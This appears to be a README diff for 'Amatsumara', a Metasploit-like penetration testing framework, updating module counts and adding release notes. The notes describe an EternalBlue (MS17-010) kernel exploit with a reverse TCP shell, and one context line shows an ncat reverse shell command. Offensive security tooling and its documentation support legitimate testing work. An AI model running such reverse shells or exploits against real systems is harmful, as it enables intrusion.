@@ -22,7 +22,7 @@ Amatsumara is a penetration testing framework that provides a Metasploit-like ex
 
 | | Count |
 |---|---|
-| Exploit Modules | 78 |
+| Exploit Modules | 77 |
 | Auxiliary Modules | 16 |
 | Post-Exploitation Modules | 2 |
 | Payload Generators | 9 |
@@ -278,7 +278,7 @@ ncat 10.0.0.5 9001 -e /bin/sh
 
 ## Module Types
 
-### Exploits (62)
+### Exploits (77)
 
 Exploit modules target specific vulnerabilities in services, applications, and operating systems. Each module implements real protocol-level exploit logic (SMB negotiation, RDP handshakes, HTTP-specific CVE payloads, etc.). Categories include:
 
@@ -529,7 +529,25 @@ Find the offset of a pattern value:
 
 ## Roadmap
 
-### v1.0.0 (Current Release)
+### v1.3.0 (Current Release)
+- [x] **Full MS17-010 EternalBlue implementation** — kernel-level RCE via SMBv1 pool overflow
+  - Raw SMB1 protocol stack, non-paged pool grooming, SrvOs2FeaListToNt integer overflow
+  - Embedded x64 kernel shellcode (ring-0 → ring-3 APC injection) + userland reverse TCP shell
+  - SrvNet buffer corruption with fake SRVNET_BUFFER_HDR targeting HAL heap
+  - Runtime LHOST/LPORT patching, integrated reverse shell listener, automatic session registration
+  - 5 unit tests (handshake safety, shellcode patching, struct validation)
+- [x] Removed duplicate MS17-010 stub module
+
+### v1.2.0
+- [x] 8 high-impact exploit modules (70 → 78 exploits)
+
+### v1.1.0
+- [x] 8 new HTTP-based exploit modules (62 → 70 exploits)
+
+### v1.0.1
+- [x] HTTPS transport fix — migrated 22 exploit modules from raw TcpStream to reqwest
+
+### v1.0.0
 - [x] Dynamic module loading via C FFI
 - [x] Module registry and auto-discovery
 - [x] Interactive console with tab completion
@@ -539,7 +557,7 @@ Find the offset of a pattern value:
 - [x] Global options (`setg`/`unsetg`)
 - [x] Background jobs (`run -j`, `jobs`, `kill`)
 - [x] Shinto-themed aliases (`forge`, `strike`)
-- [x] 62 exploit modules (200+ more in development)
+- [x] 62 exploit modules
 - [x] 16 auxiliary modules
 - [x] 2 post-exploitation modules
 - [x] 9 payload generators (bash, python, perl, ruby, netcat, php, powershell, binary)
